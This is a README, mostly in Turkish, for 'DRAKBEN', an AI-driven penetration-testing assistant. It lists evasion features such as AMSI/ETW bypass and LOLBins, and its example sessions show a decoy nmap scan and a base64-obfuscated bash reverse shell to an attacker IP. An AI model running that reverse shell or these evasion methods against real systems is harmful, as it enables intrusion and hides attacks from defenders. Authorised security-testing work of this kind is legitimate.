# 🩸 DRAKBEN v5.0 - ULTIMATE PENTEST AI ASSISTANT

**Professional Penetration Testing Platform - 2026 Edition with Modern Evasion**

---

## ⚡ Hızlı Başlangıç

```bash
cd drakbendosyalar
python3 -m venv .venv
source .venv/bin/activate  # Linux/Kali
pip install -r requirements.txt
# Optional: export OPENROUTER_API_KEY="your_key"
python3 drakben.py
```

---

## 🎯 Ana Özellikler (2024-2025)

### ✅ Yeni Eklenen Modern Teknikler

1. **2024-2025 Modern Evasion Techniques**
   - 🔓 **AMSI Bypass** - 3 memory patching method
   - 📝 **ETW Bypass** - Event logging disable
   - 🛠️ **LOLBins** - certutil, bitsadmin, mshta, regsvr32, rundll32, wmic
   - 💾 **Fileless Execution** - In-memory payloads
   - 🐳 **Container Escape** - Docker/Kubernetes breakout
   - ☁️ **Cloud Metadata Exploitation** - AWS/Azure/GCP

2. **2024-2025 CVE Database**
   - Node.js 21.x (CVE-2024-21890)
   - Redis 7.2 (CVE-2024-31228)
   - Docker 24.x (CVE-2024-21626)
   - Kubernetes 1.27 (CVE-2024-3177)
   - Jenkins 2.426 (CVE-2024-23897)
   - GitLab 16.7 (CVE-2024-0402)
   - Spring4Shell, Log4Shell
   - MongoDB 7.x, Tomcat 10.x

3. **Enhanced OPSEC Intelligence**
   - 📊 **Stealth Score** - 0-100 risk assessment
   - 💡 **Evasion Suggestions** - Real-time alternatifler
   - 🎯 **Modern Detection** - PowerShell logging, EDR, Cloud API
   - 🔄 **Stealth Alternatives** - Otomatik düşük riskli öneriler

---

## 📊 Komut Referansı

### Setup & Config
| Komut | Açıklama |
|-------|----------|
| `setup` | Kali araçlarını taraması |
| `target <ip>` | Hedef belirle |
| `strategy <mod>` | Strateji seç (stealthy/balanced/aggressive) |

### Offensive Operations
| Komut | Açıklama |
|-------|----------|
| `scan` | Hedef taraması (OPSEC-aware) |
| `exploit` | Açıkları exploit et |
| `payload` | Modern payload üret |

### Analysis & Reporting
| Komut | Açıklama |
|-------|----------|
| `results` | Bulunmuş açıkları göster |
| `chain` | Mevcut zinciri göster |

### Utility
| Komut | Açıklama |
|-------|----------|
| `help` | Menü göster |
| `clear` | Ekranı temizle |
| `exit` | Programdan çık |

---

## 🔧 Mimarı Bileşenler

### Core Modules (`core/`)

| Dosya | Amaç |
|-------|------|
| `drakben.py` | Ana program - Tüm sistemi yönet |
| `executor.py` | Komut çalıştırıcı + logging |
| `advanced_chain_builder.py` | Strateji-bazlı zincir planlama |
| `zero_day_scanner.py` | CVE eşleştirme + exploit önerisi |
| `payload_intelligence.py` | Modern payload üretimi |
| `kali_detector.py` | Kali araçları auto-detect |
| `approval.py` | Onay sistemi UI |
| `opsec_intelligence.py` | Detection avoidance |

### LLM Brain (`llm/`)

| Dosya | Amaç |
|-------|------|
| `brain.py` | Intent analizi + Fallback responses |
| `openrouter_client.py` | OpenRouter/DeepSeek API |

### Pentest Modules (`modules/`)

- `recon.py` - Pasif keşif
- `exploit.py` - Exploit otomasyonu
- `payload.py` - Payload delivery
- +15 daha...

---

## 💡 Kullanım Örnekleri

### Örnek 1: Sessiz Tarama
```
🩸 Drakben > strategy stealthy
✅ Strateji: stealthy

🩸 Drakben > target 192.168.1.100
✅ Hedef: 192.168.1.100

🩸 Drakben > scan

🔍 Stealthy tarama başlıyor...
[Uses: nmap -sS --scan-delay 500ms -D RND:5]

⚠️  3 zafiyet bulundu!
  • CVE-2021-41773 (Apache 2.4.49)
```

### Örnek 2: Exploit Seçme
```
🩸 Drakben > exploit

🎯 Bulunmuş Açıklar:
  1. CVE-2021-41773 - Apache

Seç: 1

🚀 Exploit önerisi:
   Tool: curl
   Komut: curl -v 'http://target/cgi-bin/...'

Approve? (y/n): y
```

### Örnek 3: Payload Üretimi
```
🩸 Drakben > payload

🔧 Payload Türü:
  1. reverse_shell_bash
  2. reverse_shell_powershell

Seç: 1

📝 Parametreler:
Attacker IP: 10.0.0.5
Port: 4444

✅ Payload:
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

Obfuscate? (base64/hex): base64
🔐 Obfuscated: YmFzaCAtaSA+Jik...
```

---

## 🔐 Güvenlik Notları

⚠️ **YASAL UYARI**: DRAKBEN sadece yetkili penetrasyon testleri için tasarlanmıştır.

🛡️ **OPSEC**: Stratejinizi engagement'a göre seçin:
- **Stealthy**: IDS/IPS ortamları için
- **Balanced**: Standart engagements
- **Aggressive**: Active exercises

📊 **Logging**: Tüm komutlar `logs/` klasörüne kaydedilir.

---

## 📦 Gereklilikler

```
requests>=2.31.0
beautifulsoup4
fpdf
jinja2
flask
tqdm
aiohttp
python-dotenv
rich
```

---

## 🚀 Gelecek Özellikleri

- [ ] Machine learning-based evasion
- [ ] Custom exploit generation
- [ ] Wireless penetration
- [ ] Cloud infrastructure testing
- [ ] Real-time session management
- [ ] Advanced reporting

---

**Version**: 3.0  
**Status**: Production-Ready  
**Target OS**: Kali Linux  
**Last Updated**: 2026-01-18

🩸 **DRAKBEN - Think Dark. Act Sharp. Exploit Harder.** 🩸
